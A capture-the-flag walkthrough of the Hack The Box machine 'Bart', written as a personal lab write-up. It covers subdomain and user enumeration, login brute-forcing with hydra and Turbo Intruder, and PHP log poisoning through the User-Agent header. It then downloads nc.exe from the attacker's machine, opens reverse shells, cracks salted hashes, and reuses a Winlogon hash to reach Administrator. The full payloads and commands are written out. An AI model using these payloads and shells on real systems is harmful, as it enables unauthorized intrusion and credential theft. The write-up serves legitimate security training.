# Summary
Only one port open, and it is port 80. A little bit of digging later and I was able to find a sub-domain. The sub-domain had a login page, which could be bruteforced, and thats what I did. Once logged in, I was able to take advantage of a misconfiguration and get a reverse shell on the target machine. Privesc: I found creds for mysql, and was able to login to the mysql service and enumerate a db that had hashes. From there I was able to bruteforce the given hashes and gain access to the user Harvey

 As user Harvey I'm able to display all the information on `Winlogon`, and from there was able to get the admin hash. The admin hash can be used as if it was a plain-text password, so I was just able to login as admin.

# Exploitation
As usual i'm going to add the ip `10.10.10.81` to my `/etc/hosts/` as `bart.htb`, lets get started !
![Image](/assets/bart/000.png)  

Same as every other box, lets start with a `nmap` scan to check for any open ports:
![Image](/assets/bart/001.png)  

Looking into the webserver:
![Image](/assets/bart/missed.png)  

Port 80 is open, but I can't seem to connect to it. In the image above, it says "We can't connect to the server at `forum.bart.htb`, so lets try and add that to our hosts file & reconnect:
![Image](/assets/bart/003.png)  

Possible users on the target machine:
![Image](/assets/bart/004.png)  

And there we go! While going through the source code of the webserver, I noticed a comment talking about things that need to be implemented in the future:
![Image](/assets/bart/005.png)  

If you look you'll see `mailto:h.potter@bart.htb`, which could be a possible user, and if we follow the same format as potter, then we have 4 potential users:
```
s.brown
d.simmions
r.hiltion
h.potter
```

Other then the above, I found nothing else. So onto gobuster:
![Image](/assets/bart/006.png)  

Looks like gobust won't be able to properly dirb the site, so I'm just going to use wfuzz to do it for me. Reasom being is because I can hide responses with x amount of chars:
![Image](/assets/bart/007.png)

And there we go.. Now to add `monitor` to my `/etc/hosts` file, and on to `monitor.bart.htb`:
![Image](/assets/bart/008.png)

Doing a quick search on the `PHP Server Monitor` version shows that there aren't any known exploits yet. The forget password function looks interesting. Maybe we can use it to check for valid users:
![Image](/assets/bart/009.png)

Looks like we're able to use the `Forget password` function to easily enumerate users. (If you get a valid user, you'll be redirected to the login page). `daniel`& `harvey` are the only valid ones.

I'll save you the time here; I tried bruteforcing the login, and was not able to get any hits, so the nex thing I did was use a tool called `cewl` to generate a custom wordlist based off the information on `forum.bart.htb`:
![Image](/assets/bart/010.png)

One more thing to make sure we don't miss anything, is to make a upper / lower case version of each word in the wordlist:
```
sed 's/\w/\l&/' wordlist.txt | sed 's/\w/\u&/' wordlist.txt > bart-wordlist.txt
```

Onto bruteforcing. I'll be using `Turbo intruder`, which is a `burpsuite` extension. You'll firstneed to install it, then intercept a login req. From there just highlight the word you want to be bruteforced, and send it to `Turbo intruder`; you'll want to change the wordlist to the custom one we made. Here's what my burp req looks like:
```
POST /? HTTP/1.1
Host: monitor.bart.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0

```

When you click send to `Turbo intruder` you should see something similar the the below image, but with the wordlist being different, so just make sure to change it to the one we made:
![Image](/assets/bart/011.png)

After around ~ 1 minute you should get a hit.. The creds to login are `harvey:potter`:
![Image](/assets/bart/012.png)

Under `Servers` is the `internal chat` server, and if you click on it, it'll just start (atleast for me):
![Image](/assets/bart/013.png)

Now to add `internal-01.bart.htb` to my `/etc/hosts` file. Connecting to `internal-01.bart.htb`:
![Image](/assets/bart/014.png)

Another login.. I tried the creds we got earlier, and just got back `the password must be at least 8 chars`.
![Image](/assets/bart/015.png)

Since the password has to be more then 8 chars, we can grab words with 8 chars or more from `rockyou.txt` -- here's the command to do so:
```
grep '.\{8\}' /usr/share/wordlists/rockyou.txt | head -n 500 > bart-dev-wordlist
```

Now all we need to do now is look at what params the login wants, and run hydra on the login page:
```
hydra -l harvey -P bart-dev-wordlist -t 60 internal-01.bart.htb  http-form-post "/simple_chat/login_form.php:uname=^USER^&passwd=^PASS^&submit=Login:F=Invalid Username or Password"
```

Once again, after around ~ 1 minute you should get a hit. The creds are `harvey:Password`. Logging in time:
![Image](/assets/bart/016.png)

Not much to see above, but the source code has some interesting notes:
![Image](/assets/bart/017.png)

Pretty conspicuous get req.. Connecting to `http://internal-01.bart.htb/log/log.php?&username=harvey&filename=log.php`:
![Image](/assets/bart/018.png)

Everytime I reload the page it logs me by using my user agent.. So could there be log poisoning? Well if you check the req out in burp, and attempt to mess around with the value `User-Agent` you'll see that whatever you put in your `User-Agent` value it'll get written to `log.php`. So all we got to do to get RCE is inject a small pice of PHP code:
```
GET /log/log.php?&username=harvey&filename=log.php HTTP/1.1
Host: internal-01.bart.htb
User-Agent: <?php echo system($_GET["cmd"]); ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: PHPSESSID=v3jcjjj77dumj5cbmpo0q6ds53
Connection: close
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache
```

As you can see in the above req, I injected the php code `<?php echo system($_GET["cmd"]); ?>` into the `User-Agent` value. All we got to do now is use the `cmd` paramater to issue commands on the target machine. Running `ifconfig`:
![Image](/assets/bart/019.png)


Now to get a shell. The first thing I want to do is get netcat onto the target machine. The plan is to inject another php command into the `User-Agent` value again, and have it download `nc.exe` from my attacking machine. Then from there we can use `cmd` to execute `nc.exe`. We'll first need to setup a server using python:
```
python3 -m http.server 8888
```

Once that's up and running, we can inject into the `User-Agent` value:
```
GET /log/log.php?&username=harvey&filename=log.php HTTP/1.1
Host: internal-01.bart.htb
User-Agent: <?php echo exec("powershell -command \"(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.21/nc.exe','nc.exe')\""); ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: PHPSESSID=v3jcjjj77dumj5cbmpo0q6ds53
Connection: close
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache
Content-Length: 0
````
![Image](/assets/bart/020.png)

Now to get a shell :D. I setup a quick script to easily run commands using the php script we uploaded earlier to get RCE. Here's the script -- just copy and paste it into a file, and `chmod +x filename` then `./filename`:
```
#!/usr/bin/env python3

import requests

while True:    # infinite loop
	CMD = input("#: ")
	url = "http://internal-01.bart.htb/log/log.php?cmd="+CMD+"&username=harvey"
	r = requests.post(url)
	print(r.text)
````

Output:
![Image](/assets/bart/021.png)

A little messy, but it works. Now to use `nc.exe` to get a shell. Make sure to have a listener running locally:
```
nc -lvnp 8812
```

Now to run nc on the target machine:
![Image](/assets/bart/022.png)

And there we go -- we've got a shell.  


# Privesc to user
A little bit of hunting later, and I've found some DB creds:
![Image](/assets/bart/023.png)

A few commands later, and we've got some hashes:
![Image](/assets/bart/024.png)

There's another file in the `/includes` folder that talks about using a salt for secuirty reason:
![Image](/assets/bart/025.png)

Knowing the above, we will need to append the salt we found to the end of the hashes we found:
```
harvey  faeff13072fffdb78ec3b08427678f18295ee28b8b0befc63eea2135eee85df3:8h@tr-waswe_aT#9TaCHuPhU
bobby   e15929d8ce341f2dfa07ac7a0b6f32379e43868631f2aebc05a3a97b235d6dcc:8h@tr-waswe_aT#9TaCHuPhU
daniel   f7dbfae1e05efda233b872e9b7f709d3a0f1b042813be01d7e5b9e9788c7c801:8h@tr-waswe_aT#9TaCHuPhU
```

To crack the hashes I'll be using 'HashCatGUI':
```
hashcat64.exe -a 0 -m 1400 3 "hash.txt" "wordlist.txt"
```

Harvey was the only hash that gave back a password when cracked:
![Image](/assets/bart/026.png)

Now can use the password to login as `h.potter`. Here are the powershell commands that need to be ran to switch users:
```
C:\inetpub\wwwroot\internal-01\log>powershell.exe
powershell.exe
Windows PowerShell 
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

Cannot load PSReadline module.  Console is running without PSReadline.
PS C:\inetpub\wwwroot\internal-01\log> 
PS C:\inetpub\wwwroot\internal-01\log> $username = 'BART\h.potter' 
PS C:\inetpub\wwwroot\internal-01\log> $securePassword = ConvertTo-SecureString -AsPlainText -Force 'Password1'
PS C:\inetpub\wwwroot\internal-01\log> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword 
PS C:\inetpub\wwwroot\internal-01\log> Enter-PSSession -ComputerName localhost -Credential $credential

[localhost]: PS C:\Users\h.potter\Documents> whoami
whoami
bart\h.potter
```

You'll need to first switch to a powershell session like in the above screenshot, or the following commands above wont work. We could grab the flag right now, but i'd rather just get out of this horrible powershell session:

# Privesc
After a decent amount of enumeration, I was able to find creds used by Winlogon:  
![Image](/assets/bart/029.png)  
Password: `3130438f31186fbaf962f407711faddb`

We don't even need to bruteforce the hash, we can use it as if it was the clear-text password. Why? Well here's a quote from an article that will explain it better then I could:
>"Pass the hash (PtH) is an attack technique that is both extremely simple and dangerous when left unmitigated. An attacker does not need to crack a complex password in order to successfully execute an attack, it only needs to resend the password hash obtained elsewhere without cracking the password itself. Any system that only requires a password hash for authentication gives an attacker with the hashed password the same power as if they had the cleartext passwords." Source https://cccsecuritycenter.org/remediation/pass-the-hash

We can now do the same thing we did earlier to get a shell as `h.potter`:
```
C:\inetpub\wwwroot\internal-01\log> powershell.exe
PS C:\inetpub\wwwroot\internal-01\log> $username = 'BART\Administrator'
PS C:\inetpub\wwwroot\internal-01\log> $securePassword = ConvertTo-SecureString -AsPlainText -Force '3130438f31186fbaf962f407711faddb'
PS C:\inetpub\wwwroot\internal-01\log> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
PS C:\inetpub\wwwroot\internal-01\log> Enter-PSSession -ComputerName localhost -Credential $credential

[localhost]: PS C:\Users\Administrator\Documents> cmd.exe /c "C:\inetpub\wwwroot\internal-01\log\nc.exe 10.10.14.21 3333 -e cmd.exe"
```

Make sure to have nc up before running the last command in the above text:
